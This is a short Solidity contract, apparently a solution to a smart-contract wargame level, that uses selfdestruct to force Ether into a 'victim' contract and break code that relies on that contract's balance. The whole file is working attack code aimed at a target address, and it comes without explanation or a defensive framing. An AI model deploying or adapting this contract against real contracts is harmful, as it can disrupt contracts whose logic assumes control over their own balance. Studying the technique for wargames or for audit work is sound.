// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

contract Force {
  address payable public victimAddress;

  constructor(address payable _victimAddress) {
      victimAddress = _victimAddress;
  }

  function takeMyMoney() public payable {
    // self destructs the contract
    // targeting to the victim contract
    // in order to force its balance to increase.
    selfdestruct(victimAddress);
  }

  receive() external payable {}
}